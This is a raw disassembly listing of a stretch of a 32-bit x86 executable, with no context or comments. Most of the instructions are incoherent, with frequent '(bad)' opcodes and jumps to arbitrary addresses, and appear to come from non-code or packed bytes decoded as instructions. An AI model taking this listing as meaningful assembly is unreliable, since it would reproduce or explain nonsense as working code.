  40a411:	aad    0x1d
  40a413:	dec    edx
  40a414:	and    ch,BYTE PTR ds:0xd8d0003d
  40a41a:	and    al,0xfe
  40a41c:	add    bh,BYTE PTR [ebp+eax*8+0x21]
  40a420:	adc    DWORD PTR [eax+0x74762a06],edx
  40a426:	dec    ebp
  40a427:	je     0x40a497
  40a429:	dec    edx
  40a42a:	imul   ebx,DWORD PTR [esi+0x70],0xfffc6d40
  40a431:	fld    QWORD PTR [esi]
  40a433:	add    ah,BYTE PTR [edi+0x64]
  40a436:	dec    ebp
  40a437:	ins    BYTE PTR es:[edi],dx
  40a438:	dec    ebp
  40a439:	inc    esp
  40a43a:	inc    edx
  40a43b:	pop    ebp
  40a43c:	imul   esi,DWORD PTR [eax+0x60],0x444a4516
  40a443:	(bad)  
  40a444:	jg     0x40a441
  40a446:	pop    ss
  40a447:	sbb    al,0x5a
  40a449:	js     0x40a4a7
  40a44b:	jne    0x40a4af
  40a44d:	push   ecx
  40a44e:	jne    0x40a4a9
  40a450:	mov    eax,0x7a2b7e7e
  40a455:	dec    ebx
  40a456:	and    DWORD PTR [edx+0x46],esp
  40a459:	push   0x5b
  40a45b:	jb     0x40a498
  40a45d:	ins    DWORD PTR es:[edi],dx
  40a45e:	jg     0x40a4bd
  40a460:	jge    0x40a435
  40a462:	(bad)  
  40a463:	inc    DWORD PTR [edx+0x73]
  40a466:	jbe    0x40a49f
  40a468:	push   0x4b
  40a46a:	pop    edx
  40a46b:	xor    al,0x15
  40a46d:	or     al,0x2d
  40a46f:	adc    DWORD PTR [ebx],eax
  40a471:	adc    edi,DWORD PTR [edi]
  40a473:	push   cs
  40a474:	daa    
  40a475:	add    ch,dh
  40a477:	push   esi
  40a478:	das    
  40a479:	or     DWORD PTR [eax+0xc],ebp
  40a47c:	fdivr  st(4),st
  40a47e:	call   DWORD PTR [edi]
  40a480:	pop    eax
  40a481:	sub    BYTE PTR [eax],ch
  40a483:	popa   
  40a484:	add    eax,0x7d36177a
  40a489:	jp     0x40a4c2
  40a48b:	or     eax,0x1791838
  40a490:	int3   
  40a491:	push   ds
  40a492:	xor    al,0x2b
  40a494:	(bad)  
  40a495:	jmp    FWORD PTR [edi+0x19b29230]
  40a49b:	add    eax,0x580d0c78
  40a4a0:	imul   esi,DWORD PTR [esi+0x58],0x5c
  40a4a4:	push   ebp
  40a4a5:	pop    ecx
  40a4a6:	pop    ebp
  40a4a7:	jb     0x40a4f2
  40a4a9:	add    bh,BYTE PTR [eax+0x58]
  40a4ac:	gs sbb eax,ebx
  40a4af:	add    bh,bh
  40a4b1:	inc    DWORD PTR [ebp+0x69]
  40a4b4:	push   0x65
  40a4b6:	push   ecx
  40a4b7:	push   ecx
  40a4b8:	adc    eax,0x1b624051
  40a4bd:	dec    ebp
  40a4be:	push   edx
  40a4bf:	inc    ebp
  40a4c0:	outs   dx,DWORD PTR ds:[esi]
  40a4c1:	dec    ebp
  40a4c2:	mov    ds:0xad178aca,al
  40a4c7:	jp     0x40a546
  40a4c9:	js     0x40a522
  40a4cb:	jl     0x40a493
  40a4cd:	inc    ebp
  40a4ce:	fs inc eax
  40a4d0:	cmp    WORD PTR [ebx+0x4a],bp
  40a4d4:	mov    WORD PTR [edi+0x46ff15e3],?
  40a4da:	pop    ebp
  40a4db:	inc    edi
  40a4dc:	pop    ebp
  40a4dd:	inc    ecx
  40a4de:	push   esi
  40a4df:	dec    esp
  40a4e0:	push   0x3e0538f6
  40a4e5:	push   cs
  40a4e6:	cmp    dl,BYTE PTR [eax+eax*1+0x13]
  40a4ea:	cmp    DWORD PTR [edi],esp
  40a4ec:	pop    es
  40a4ed:	scas   eax,DWORD PTR es:[edi]
  40a4ee:	cli    
  40a4ef:	xchg   bh,bh
  40a4f1:	daa    
  40a4f2:	cmp    bh,BYTE PTR [ecx]
  40a4f4:	pop    ss
  40a4f5:	ins    BYTE PTR es:[edi],dx
  40a4f6:	aaa    
  40a4f7:	aas    
  40a4f8:	ds push 0x303b1f92
  40a4fe:	push   ss
  40a4ff:	and    dh,dh
  40a501:	sub    DWORD PTR ds:0xfffd0034,edi
  40a507:	inc    DWORD PTR [edx+0xb311a1a]
  40a50d:	jae    0x40a539
  40a50f:	push   0x5d792006
  40a514:	jnp    0x40a58d
  40a516:	pop    ebp
  40a517:	add    edx,DWORD PTR ds:0x4202515e
  40a51d:	push   ds
  40a51e:	addr16 inc eax
  40a520:	push   eax
  40a521:	add    bh,ah
  40a523:	add    eax,0x1e20b670
  40a528:	imul   ebp,DWORD PTR [ecx+ecx*2+0x59],0x65
  40a52d:	jb     0x40a599
  40a52f:	jmp    0xd872:0x4bdbffff
  40a536:	or     edx,DWORD PTR [edi+0x5d]
  40a539:	das    
  40a53a:	dec    eax
  40a53b:	inc    ebx
  40a53c:	pop    esp
  40a53d:	dec    ebx
  40a53e:	push   ebp
  40a53f:	pop    esi
  40a540:	inc    ebx
  40a541:	sub    al,0x5e
  40a543:	inc    eax
  40a544:	and    DWORD PTR [ebx+0x74],esi
  40a547:	inc    ebx
  40a548:	dec    ebx
  40a549:	xor    al,0x5c
  40a54b:	call   FWORD PTR [ebx]
  40a54d:	cmp    bl,BYTE PTR [edx+0x727524f8]
  40a553:	xor    BYTE PTR [eax+0x85d2d4e],bh
  40a559:	add    al,0x2c
  40a55b:	adc    ecx,DWORD PTR [edi+edx*1]
  40a55e:	or     al,0xff
  40a560:	jmp    FWORD PTR [edi+0x501c35fa]
  40a566:	or     DWORD PTR [esi+edx*4],ebp
  40a569:	pop    ds
  40a56a:	pop    ss
  40a56b:	and    al,0xc
  40a56d:	adc    BYTE PTR ds:[eax],dh
  40a570:	sbb    eax,0x227b0513
  40a575:	add    edi,DWORD PTR ds:0x1b3d7a15
  40a57b:	or     ch,BYTE PTR ds:0xffb7e3bf
  40a581:	push   es
  40a582:	sbb    DWORD PTR [ecx+0x21],edi
  40a585:	xor    eax,0x2b7a1773
  40a58a:	dec    BYTE PTR [ecx]
  40a58c:	pop    ebx
  40a58d:	push   ebx
  40a58e:	jg     0x40a592
  40a590:	push   0x2a
  40a592:	xorps  xmm6,XMMWORD PTR [edi+0x78]
  40a596:	add    ecx,DWORD PTR [ebx-0x1]
  40a599:	(bad)  
  40a59a:	(bad)  
  40a59b:	dec    DWORD PTR [ebx+0x51]
  40a59e:	dec    ebx
  40a59f:	sbb    bl,BYTE PTR [esi+0x44]
  40a5a2:	sbb    BYTE PTR [ebp+0x4c],bl
  40a5a5:	sbb    eax,DWORD PTR [eax+0x65]
  40a5a8:	push   ebx
  40a5a9:	pusha  
  40a5aa:	gs jnp 0x40a5f4
  40a5ad:	arpl   WORD PTR [esi+0x35],sp
  40a5b0:	das    
  40a5b1:	jns    0x40a5db
  40a5b3:	push   0x59565a49
  40a5b8:	fs ins BYTE PTR es:[edi],dx
  40a5ba:	bound  ebx,QWORD PTR [ebx+0x1c]
  40a5bd:	stos   DWORD PTR es:[edi],eax
  40a5be:	or     dh,al
  40a5c0:	jns    0x40a618
  40a5c2:	inc    ecx
  40a5c3:	ss jo  0x40a607
  40a5c6:	fadd   DWORD PTR [ebp+0x46]
  40a5c9:	sbb    bl,bh
  40a5cb:	jo     0x40a5a4
  40a5cd:	fild   WORD PTR [edx+0x53]
  40a5d0:	sub    BYTE PTR fs:[edx],al
  40a5d3:	aas    
  40a5d4:	inc    eax
  40a5d5:	divps  xmm3,XMMWORD PTR ds:0x25a2242e
  40a5dc:	adc    esp,DWORD PTR [ecx]
  40a5de:	ds sbb edi,edi
  40a5e1:	mov    edi,esi
  40a5e3:	call   FWORD PTR [ecx]
  40a5e5:	cmp    eax,0x6d03322e
  40a5ea:	cmp    al,0x3
  40a5ec:	adc    al,0x3d
  40a5ee:	sub    esp,DWORD PTR es:[edi+0x11]
  40a5f2:	pop    ss
  40a5f3:	inc    esi
  40a5f4:	cmp    ah,BYTE PTR ds:[edx]
  40a5f7:	adc    edi,DWORD PTR [ebx+0x33]
  40a5fa:	pop    ss
  40a5fb:	sbb    eax,0xfffa6803
  40a600:	(bad)  
  40a602:	and    eax,0x7a4f790c
  40a607:	pop    esp
  40a608:	inc    esi
  40a609:	fimul  WORD PTR [edx]
  40a60b:	push   ebp
  40a60c:	push   cs
  40a60d:	dec    edi
  40a60e:	pop    ebp
  40a60f:	jbe    0x40a617
  40a611:	push   ebp
  40a612:	bound  eax,QWORD PTR [eax+0x7c]
  40a615:	pop    esi
  40a616:	sbb    eax,0x4a4d7f5f
  40a61b:	dec    esi
  40a61c:	or     DWORD PTR [esi+0x4750affa],ebp
  40a622:	push   ebp
  40a623:	push   ecx
  40a624:	gs dec di
  40a627:	push   ebx
  40a628:	push   0x79
  40a62a:	ret    0x555f
  40a62d:	jle    0x40a61d
  40a62f:	jmp    FWORD PTR [ebx+0x5a3a17ec]
  40a635:	inc    esp
  40a636:	inc    ecx
  40a637:	inc    eax
  40a638:	pop    ebx
  40a639:	cmp    al,0x3a
  40a63b:	push   ds
  40a63c:	jg     0x40a696
  40a63e:	jb     0x40a6a9
  40a640:	inc    esp
  40a641:	popa   
  40a642:	ja     0x40a6be
  40a644:	push   ecx
  40a645:	pop    es
  40a646:	(bad)  
  40a647:	inc    DWORD PTR [esi+0x110800ff]
  40a64d:	sub    eax,0x1601095f
  40a652:	dec    esi
  40a653:	xchg   esp,eax
  40a654:	sub    ebp,DWORD PTR [ecx]
  40a656:	adc    eax,0x6e181c2f
  40a65b:	cmp    BYTE PTR ds:0x2236292e,cl
  40a661:	adc    dl,BYTE PTR ss:[esi]
  40a664:	aaa    
  40a665:	std    
  40a666:	(bad)  
  40a667:	(bad)  
  40a668:	cmp    esp,DWORD PTR ds:0x3d1c0502
  40a66e:	add    DWORD PTR [esi],ebx
  40a670:	and    edi,DWORD PTR [eax+edx*1]
  40a673:	jle    0x40a6ec
  40a675:	cs pop es
  40a677:	jp     0x40a68e
  40a679:	aaa    
  40a67a:	xor    eax,0xd85e6f0c
  40a67f:	pop    ebx
  40a680:	inc    eax
  40a681:	push   esp
  40a682:	(bad)  
  40a683:	(bad)  
  40a684:	call   DWORD PTR ds:0x52776f64
  40a68a:	push   edi
  40a68b:	inc    esi
  40a68c:	pusha  
  40a68d:	sbb    al,0x48
  40a68f:	arpl   WORD PTR [ebx+0x7e],sp
  40a692:	adc    al,BYTE PTR [edx]
  40a694:	adc    DWORD PTR [ecx+0x6c],eax
  40a697:	push   edx
  40a698:	inc    edi
  40a699:	je     0x40a6ea
  40a69b:	sbb    BYTE PTR [ebx+0x4f],dl
  40a69e:	ja     0x40a70f
  40a6a0:	lock call DWORD PTR [eax-0x3]
  40a6a4:	jle    0x40a6da
  40a6a6:	jne    0x40a6fe
  40a6a8:	jle    0x40a711
  40a6aa:	mov    edx,0x48254554
  40a6af:	cmp    al,0x59
  40a6b1:	pop    edi
  40a6b2:	outs   dx,DWORD PTR ds:[esi]
  40a6b3:	push   ebx
  40a6b4:	(bad)  
  40a6b5:	(bad)  
  40a6b6:	call   FWORD PTR [edi-0x8]
  40a6b9:	pop    esi
  40a6ba:	pusha  
  40a6bb:	fs inc edx
  40a6bd:	push   esi
  40a6be:	pop    ebx
  40a6bf:	dec    esp
  40a6c0:	cmp    bh,BYTE PTR ds:0x1b58335b
  40a6c6:	cmp    BYTE PTR [edi],ch
  40a6c8:	and    edx,DWORD PTR [ebx]
  40a6ca:	add    dl,BYTE PTR ds:0x27582026
  40a6d0:	adc    al,0xd
  40a6d2:	and    eax,0x1b313b36
  40a6d7:	outs   dx,BYTE PTR ds:[esi]
  40a6d8:	jg     0x40a6ad
  40a6da:	punpcklwd mm7,mm2
  40a6dd:	push   ds
  40a6de:	cmp    al,0x31
  40a6e0:	and    DWORD PTR [ecx],ebx
  40a6e2:	sbb    esi,DWORD PTR [esi]
  40a6e4:	ficom  DWORD PTR [ecx]
  40a6e6:	sub    DWORD PTR [edi],ebx
  40a6e8:	mov    al,0x25
  40a6ea:	sub    ch,dh
  40a6ec:	sbb    edi,esi
  40a6ee:	dec    DWORD PTR [edx]
  40a6f0:	pcmpeqw mm6,QWORD PTR [ecx]
  40a6f3:	aaa    
  40a6f4:	ins    BYTE PTR es:[edi],dx
  40a6f5:	inc    edi
  40a6f6:	pop    esp
  40a6f7:	jge    0x40a765
  40a6f9:	jl     0x40a769
  40a6fb:	or     ah,BYTE PTR [ebp+0x70]
  40a6fe:	outs   dx,BYTE PTR ds:[esi]
  40a6ff:	sbb    BYTE PTR [ecx],al
  40a701:	or     BYTE PTR [edx+0x5c],ch
  40a704:	jp     0x40a775
  40a706:	fsub   DWORD PTR [ebp+ebx*2-0x46]
  40a70a:	pop    ebx
  40a70b:	ins    BYTE PTR es:[edi],dx
  40a70c:	pop    edx
  40a70d:	dec    edx
  40a70e:	jne    0x40a72d
  40a710:	ins    BYTE PTR es:[edi],dx
  40a711:	dec    eax
  40a712:	adc    dh,BYTE PTR [eax+edx*2]
  40a715:	call   0x5f40a6c1
  40a71a:	ins    DWORD PTR es:[edi],dx
  40a71b:	outs   dx,BYTE PTR ds:[esi]
  40a71c:	jle    0x40a79b
  40a71e:	dec    esp
  40a71f:	jg     0x40a774
  40a721:	es es push ebp
  40a724:	and    esi,DWORD PTR [ebp+0x7d]
  40a727:	jle    0x40a7a4
  40a729:	xor    al,0xde
  40a72b:	push   0x31
  40a72d:	dec    esp
  40a72e:	cmc    
  40a72f:	call   DWORD PTR ds:0x6a4298bf
  40a735:	sub    DWORD PTR [edi+0xb],esp
  40a738:	cs out 0x4,al
  40a73b:	sbb    ebx,DWORD PTR ds:0x222b0f37
  40a741:	push   ecx
  40a742:	sub    eax,0xa683251
  40a747:	(bad)  
  40a748:	inc    DWORD PTR [edx]
  40a74a:	pop    esp
  40a74b:	jp     0x40a776
  40a74d:	or     DWORD PTR [eax],ebp
  40a74f:	call   0x7878da92
  40a754:	es xor eax,0x3037713
  40a75a:	sbb    edi,DWORD PTR ss:[eax+0x13]
  40a75e:	jp     0x40a773
  40a760:	in     eax,dx
  40a761:	adc    eax,0x2b01d06f
  40a766:	sub    ch,BYTE PTR [esi+0x22]
  40a769:	jle    0x40a771
  40a76b:	pop    eax
  40a76c:	add    cl,BYTE PTR [ebx+0x16]
  40a76f:	pop    ecx
  40a770:	push   cs
  40a771:	pop    es
  40a772:	(bad)  
  40a773:	call   DWORD PTR [edi]
  40a775:	std    
  40a776:	push   ebp
  40a777:	push   edi
  40a778:	bound  eax,QWORD PTR [ebx+0x53]
  40a77b:	pop    edi
  40a77c:	jmp    0x434b:0x4146617d
  40a783:	adc    al,0x73
  40a785:	jl     0x40a7fb
  40a787:	push   0x6f
  40a789:	outs   dx,BYTE PTR ds:[esi]
  40a78a:	outs   dx,DWORD PTR ds:[esi]
  40a78b:	sub    al,0x4c
  40a78d:	dec    eax
  40a78e:	sub    eax,0xebbfe35b
  40a793:	inc    DWORD PTR [ecx+0x5e]
  40a796:	arpl   WORD PTR [edi+0x47],dx
  40a799:	push   edx
  40a79a:	inc    ebx
  40a79b:	pop    ebx
  40a79c:	imul   esp,DWORD PTR [edx],0x7d76c869
  40a7a2:	inc    ecx
  40a7a3:	data16 cmp al,0x52
  40a7a6:	arpl   WORD PTR [ebx+esi*1-0x2f],si
  40a7aa:	(bad)  
  40a7ab:	(bad)  
  40a7ac:	mov    edi,0x370d7694
  40a7b1:	sub    ebx,DWORD PTR [edx+0x19]
  40a7b4:	sbb    al,0x1
  40a7b6:	sbb    eax,0x5b2c4a02
  40a7bb:	add    al,0x11
  40a7bd:	adc    ch,BYTE PTR [ebx]
  40a7bf:	aas    
  40a7c0:	pop    ss
  40a7c1:	cmp    edx,DWORD PTR [edi]
  40a7c3:	xor    bl,BYTE PTR [esi]
  40a7c5:	add    DWORD PTR [ebx+edx*8],ecx
  40a7c8:	scas   eax,DWORD PTR es:[edi]
  40a7c9:	pop    edx
  40a7ca:	jno    0x40a7fd
  40a7cc:	or     eax,0x2e36741f
  40a7d1:	out    dx,al
  40a7d2:	adc    eax,0xd191c1e
  40a7d7:	jbe    0x40a833
  40a7d9:	mov    bl,BYTE PTR [ebx]
  40a7db:	(bad)  
  40a7dc:	jg     0x40a80e
  40a7de:	sbb    eax,DWORD PTR [edi]
  40a7e0:	aaa    
  40a7e1:	es dec ecx
  40a7e3:	adc    DWORD PTR [ecx+ebx*2+0x4e],edi
  40a7e7:	pop    eax
  40a7e8:	imul   ebp,DWORD PTR [ebx+0x5a],0x5005638a
  40a7ef:	outs   dx,BYTE PTR ds:[esi]
  40a7f0:	pop    esp
  40a7f1:	cmc    
  40a7f2:	jg     0x40a7c5
  40a7f4:	inc    eax
  40a7f5:	dec    ebp
  40a7f6:	mov    dl,0x67
  40a7f8:	push   edx
  40a7f9:	pop    ecx
  40a7fa:	pop    es
  40a7fb:	adc    al,0x45
  40a7fd:	jae    0x40a80e
  40a7ff:	push   0x4a124c41
  40a804:	ins    DWORD PTR es:[edi],dx
  40a805:	dec    ebp
  40a806:	mov    edx,0x8002d168
  40a80b:	ins    DWORD PTR es:[edi],dx
  40a80c:	pop    ecx
  40a80d:	ds pop edi
  40a80f:	es in  al,0x41
  40a812:	push   0xdfffc039
  40a817:	and    eax,0x7f5c88a4
  40a81c:	cmp    al,0x77
  40a81e:	inc    edx
  40a81f:	jbe    0x40a851
  40a821:	sub    BYTE PTR [eax+0x51],dh
  40a824:	push   edi
  40a825:	sbb    BYTE PTR [esi],cl
  40a827:	cmp    al,0x7
  40a829:	push   ss
  40a82a:	push   esp
  40a82b:	or     BYTE PTR [esi],ch
  40a82d:	je     0x40a835
  40a82f:	sub    eax,0x65e5a10
  40a834:	test   al,0x76
  40a836:	cmp    eax,0xdf0dff86
  40a83b:	rcl    BYTE PTR [ebx],1
  40a83d:	xor    DWORD PTR [edx],edi
  40a83f:	fs push es
  40a841:	pusha  
  40a842:	and    DWORD PTR [edi],eax
  40a844:	adc    eax,0x9242a1b
  40a849:	jb     0x40a866
  40a84b:	add    ah,BYTE PTR [esi-0x1c55401]
  40a851:	jno    0x40a881
  40a853:	jbe    0x40a86c
  40a855:	jbe    0x40a85c
  40a857:	add    ebx,edx
  40a859:	push   ss
  40a85a:	jle    0x40a89f
  40a85c:	inc    ecx
  40a85d:	pop    ss
  40a85e:	addr16 dec edi
  40a860:	push   ds
  40a861:	push   esi
  40a862:	add    BYTE PTR [ebx+0x7],dl
  40a865:	call   DWORD PTR [ebp+0x7f]
  40a868:	(bad)  
  40a869:	push   esp
  40a86a:	inc    esp
  40a86b:	push   ds
  40a86c:	dec    edi
  40a86d:	pop    ebx
  40a86e:	arpl   WORD PTR [edx+0x79],di
  40a871:	jge    0x40a892
  40a873:	mov    es,WORD PTR [edi+0x77]
  40a876:	jno    0x40a8bb
  40a878:	pop    eax
  40a879:	je     0x40a8ce
  40a87b:	ins    BYTE PTR es:[edi],dx
  40a87c:	imul   ebp,DWORD PTR [ebx+0x69fedff8],0x50
  40a883:	dec    ebx
  40a884:	and    eax,DWORD PTR [edi+0x42]
  40a887:	push   edi
  40a888:	mov    dh,0x45
  40a88a:	push   ebp
  40a88b:	ss pop ebx
  40a88d:	es aas 
  40a88f:	xor    ah,BYTE PTR [ecx+0x68]
  40a892:	jb     0x40a8c6
  40a894:	push   0xfffffff8
  40a896:	cld    
  40a897:	(bad)  
  40a898:	jg     0x40a8f1
  40a89a:	push   ecx
  40a89b:	mov    esp,0x9192a3d
  40a8a0:	sub    cl,BYTE PTR [ecx]
  40a8a2:	and    ecx,DWORD PTR [edi]
  40a8a4:	sbb    eax,0x53103a29
  40a8a9:	adc    DWORD PTR [eax],esi
  40a8ab:	cmp    edi,DWORD PTR [edi]
  40a8ad:	or     BYTE PTR es:[eax+0x17],ch
  40a8b1:	mov    bh,0xff
  40a8b3:	add    eax,0x25568210
  40a8b8:	xor    esi,DWORD PTR es:0x718182a
  40a8bf:	push   es
  40a8c0:	jnp    0x40a88a
  40a8c2:	add    ebp,DWORD PTR [esi+ebx*1-0x3]
  40a8c6:	(bad)  
  40a8c7:	(bad)  
  40a8c8:	jmp    FWORD PTR [edx+0x1e]
  40a8cb:	sub    al,0x2b
  40a8cd:	je     0x40a8fe
  40a8cf:	jge    0x40a94e
  40a8d1:	add    al,0x4a
  40a8d3:	dec    ecx
  40a8d4:	push   0x5d
  40a8d6:	or     al,0x46
  40a8d8:	inc    esi
  40a8d9:	add    esp,DWORD PTR [edi+0x1c]
  40a8dc:	jno    0x40a932
  40a8de:	pop    ds
  40a8df:	pop    esp
  40a8e0:	dec    edx
  40a8e1:	push   es
  40a8e2:	push   esp
  40a8e3:	pusha  
  40a8e4:	ins    BYTE PTR es:[edi],dx
  40a8e5:	ins    DWORD PTR es:[edi],dx
  40a8e6:	jno    0x40a8d0
  40a8e8:	stos   BYTE PTR es:[edi],al
  40a8e9:	in     eax,dx
  40a8ea:	aaa    
  40a8eb:	fdiv   QWORD PTR [ebp+0x13]
  40a8ee:	push   ss
  40a8ef:	push   eax
  40a8f0:	push   ebx
  40a8f1:	push   edi
  40a8f2:	loopne 0x40a95f
  40a8f4:	das    
  40a8f5:	hlt    
  40a8f6:	sub    al,0x6d
  40a8f8:	addr16 (bad) 
  40a8fa:	fcomip st,st(4)
  40a8fc:	mov    edi,0x2a5b5d52
  40a901:	sub    DWORD PTR [edx+0x4a],edx
  40a904:	pusha  
  40a905:	imul   ebx,DWORD PTR [esi+ebp*2+0x12],0x72
  40a90a:	push   edi
  40a90b:	xor    dh,BYTE PTR [ebp+0x74]
  40a90e:	aaa    
  40a90f:	jae    0x40a974
  40a911:	and    DWORD PTR [ecx],eax
  40a913:	add    DWORD PTR [eax],edi
  40a915:	sbb    DWORD PTR [eax-0x6f],eax
  40a918:	jge    0x40a8dd
  40a91a:	sub    eax,0x1d0c640c
  40a91f:	push   eax
  40a920:	push   edi
  40a921:	and    eax,0xa2050ed8
  40a926:	(bad)  
  40a927:	jmp    FWORD PTR [edi]
  40a929:	xchg   BYTE PTR [ebx+ebp*2],bl
  40a92c:	outs   dx,BYTE PTR ds:[esi]
  40a92d:	sbb    BYTE PTR es:[eax],al
  40a930:	and    eax,0x3c382166
  40a935:	das    
  40a936:	cmp    eax,0x3c731b7f
  40a93b:	sub    al,0x77
  40a93d:	hlt    
  40a93e:	(bad)  
  40a93f:	inc    DWORD PTR [ebp-0x76]
  40a942:	xor    esi,DWORD PTR cs:[esp]
  40a946:	pop    ebx
  40a947:	jne    0x40a9a1
  40a949:	pop    edx
  40a94a:	jno    0x40a9ae
  40a94c:	dec    edx
  40a94d:	pop    ecx
  40a94e:	jge    0x40a9ad
  40a950:	jl     0x40a997
  40a952:	pop    esi
  40a953:	imul   edi,DWORD PTR [ecx+0x73],0x0
  40a957:	cld    
  40a958:	jg     0x40a955
  40a95a:	pop    edi
  40a95b:	and    al,0x69
  40a95d:	pop    ds
  40a95e:	dec    esi
  40a95f:	inc    eax
  40a960:	outs   dx,BYTE PTR ds:[esi]
  40a961:	ins    BYTE PTR es:[edi],dx
  40a962:	push   ecx
  40a963:	jbe    0x40a9c2
  40a965:	inc    ebp
  40a966:	in     al,dx
  40a967:	adc    BYTE PTR [ebx+0x54],cl
  40a96a:	outs   dx,DWORD PTR ds:[esi]
  40a96b:	pop    edi
  40a96c:	ins    DWORD PTR es:[edi],dx
  40a96d:	jle    0x40a9d9
  40a96f:	jo     0x40a9e1
  40a971:	outs   dx,DWORD PTR ds:[esi]
  40a972:	ds sub eax,0x378042bf
  40a978:	add    al,0x62
  40a97a:	je     0x40a9dd
  40a97c:	outs   dx,DWORD PTR ds:[esi]
  40a97d:	ins    BYTE PTR es:[edi],dx
  40a97e:	mov    ds:0x69776b64,al
  40a983:	dec    esi
  40a984:	dec    ebx
  40a985:	(bad)  
  40a986:	(bad)  
  40a987:	(bad)  
  40a988:	call   FWORD PTR [ecx+0x51]
  40a98b:	push   esi
  40a98c:	or     cl,BYTE PTR [ecx]
  40a98e:	inc    edi
  40a98f:	and    al,0x41
  40a991:	cs sub al,0x36
  40a994:	sub    dl,BYTE PTR ds:0x36312a29
  40a99a:	pop    ss
  40a99b:	cmp    bl,BYTE PTR [edx]
  40a99d:	push   ss
  40a99e:	sbb    DWORD PTR [edi],edx
  40a9a0:	pop    ds
  40a9a1:	pusha  
  40a9a2:	and    DWORD PTR [edx],ebx
  40a9a4:	gs ins BYTE PTR es:[edi],dx
  40a9a6:	and    eax,DWORD PTR [eax]
  40a9a8:	jge    0x40a9a9
  40a9aa:	idiv   BYTE PTR [edi+0x3e6437e2]
  40a9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b1:	pop    ds
  40a9b2:	xor    esi,DWORD PTR [eax]
  40a9b4:	sbb    DWORD PTR [esi],ecx
  40a9b6:	cmp    eax,0xb121624
  40a9bb:	ds sub al,0x9
  40a9be:	pop    edx
  40a9bf:	pop    edi
  40a9c0:	add    eax,0xf16e7452
  40a9c5:	scas   eax,DWORD PTR es:[edi]
  40a9c6:	pop    eax
  40a9c7:	icebp  
  40a9c8:	imul   edx,DWORD PTR [ebx+0xf],0x1
  40a9cc:	je     0x40a9ce
  40a9ce:	pop    es
  40a9cf:	sbb    BYTE PTR [ebp+0x79],0x42
  40a9d3:	dec    ecx
  40a9d4:	inc    esp
  40a9d5:	push   eax
  40a9d6:	imul   esp,DWORD PTR [esi-0x56],0xffffffff
  40a9da:	(bad)  
  40a9db:	fild   QWORD PTR [eax]
  40a9dd:	pop    ss
  40a9de:	pop    ecx
  40a9df:	push   ebx
  40a9e0:	inc    edx
  40a9e1:	sbb    DWORD PTR [esi+0x27],eax
  40a9e4:	js     0x40aa0b
  40a9e6:	jns    0x40aa52
  40a9e8:	push   0x7b
  40a9ea:	daa    
  40a9eb:	gs jae 0x40aa6c
  40a9ee:	jo     0x40aa13
  40a9f0:	push   0x2bb24b23
  40a9f5:	push   ss
  40a9f6:	loopne 0x40aa05
  40a9f8:	test   al,0x67
  40a9fa:	dec    ebp
  40a9fb:	xor    DWORD PTR [esi-0x72],ecx
  40a9fe:	outs   dx,BYTE PTR ds:[esi]
  40a9ff:	pusha  
  40aa00:	mov    dh,0x5d
  40aa02:	sub    bh,bh
  40aa04:	mov    edi,0x3220f1dd
  40aa09:	pop    ebp
  40aa0a:	and    BYTE PTR [esi+0x7],ah
  40aa0d:	add    DWORD PTR [ecx],ecx
  40aa0f:	repnz xor edx,DWORD PTR [edx]
  40aa12:	sub    al,0x6f
  40aa14:	sbb    edi,DWORD PTR [edx]
  40aa16:	sbb    eax,0xd10186b
  40aa1b:	cmp    edx,DWORD PTR [eax]
  40aa1d:	sbb    edx,edi
  40aa1f:	(bad)  
  40aa20:	(bad)  
  40aa21:	(bad)  [esi+0x30]
  40aa24:	hlt    
  40aa25:	xor    eax,0x1d1e0439
  40aa2a:	jnp    0x40aa2c
  40aa2c:	es xor al,0x35
  40aa2f:	jl     0x40aa39
  40aa31:	push   ss
  40aa32:	or     eax,0x7c75160a
  40aa37:	or     ch,BYTE PTR [ebx+0x4e]
  40aa3a:	ins    BYTE PTR es:[edi],dx
  40aa3b:	jno    0x40aa28
  40aa3d:	jg     0x40aa02
  40aa3f:	scas   eax,DWORD PTR es:[edi]
  40aa40:	jo     0x40aa46
  40aa42:	pop    ebp
  40aa43:	or     eax,0x82055405
  40aa48:	add    eax,0x47537b19
  40aa4d:	pop    ebx
  40aa4e:	inc    ebp
  40aa4f:	dec    esi
  40aa50:	jl     0x40aa64
  40aa52:	dec    esp
  40aa53:	clc    
  40aa54:	fild   WORD PTR ds:0x5a461236
  40aa5a:	xor    eax,0x6c4b452b
  40aa5f:	je     0x40aacc
  40aa61:	fdiv   st(0),st
  40aa63:	jg     0x40aa36
  40aa65:	cmp    edx,DWORD PTR [edx+0x51]
  40aa68:	imul   ecx,DWORD PTR [eax+0x75],0x7c3e5c60
  40aa6f:	ins    DWORD PTR es:[edi],dx
  40aa70:	cmp    eax,DWORD PTR [eax+0x30]
  40aa73:	xor    cl,BYTE PTR [edi+0x28]
  40aa76:	fs dec edi
  40aa78:	outs   dx,DWORD PTR ds:[esi]
  40aa79:	mov    ds:0x2b4c05ff,al
  40aa7e:	pop    eax
  40aa7f:	pop    eax
  40aa80:	and    eax,0x915552a
  40aa85:	nop    esi
  40aa88:	test   al,0x9
  40aa8a:	adc    DWORD PTR [edx],esi
  40aa8c:	sub    eax,0xffffe0b4
  40aa91:	das    
  40aa92:	and    BYTE PTR [edi],bl
  40aa94:	push   ss
  40aa95:	adc    BYTE PTR cs:[ebx+ebx*1],ch
  40aa99:	jns    0x40aad0
  40aa9b:	adc    dh,BYTE PTR [edi+0x3d]
  40aa9e:	pop    ss
  40aa9f:	add    al,0x1c
  40aaa1:	sub    BYTE PTR ds:0x1423f21d,ch
  40aaa7:	(bad)  
  40aaa8:	mov    edi,0x2698df00
  40aaad:	sub    BYTE PTR [edi+0x4a],ch
  40aab0:	or     eax,0x495b4e00
  40aab5:	jae    0x40ab2a
  40aab7:	or     al,0x42
  40aab9:	inc    ecx
  40aaba:	ja     0x40ab0f
  40aabc:	jge    0x40ab1d
  40aabe:	pusha  
  40aabf:	pop    ds
  40aac0:	(bad)  
  40aac1:	(bad)  
  40aac3:	push   ebp
  40aac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aac5:	dec    ecx
  40aac6:	dec    ebp
  40aac7:	dec    esi
  40aac8:	inc    edx
  40aac9:	jb     0x40ab4a
  40aacb:	bound  esp,QWORD PTR [ebp-0x44]
  40aace:	inc    ebp
  40aacf:	push   0x4f7b5b44
  40aad4:	dec    ebx
  40aad5:	arpl   WORD PTR [ebx+0x7a],dx
  40aad8:	js     0x40ab1f
  40aada:	inc    esp
  40aadb:	(bad)  
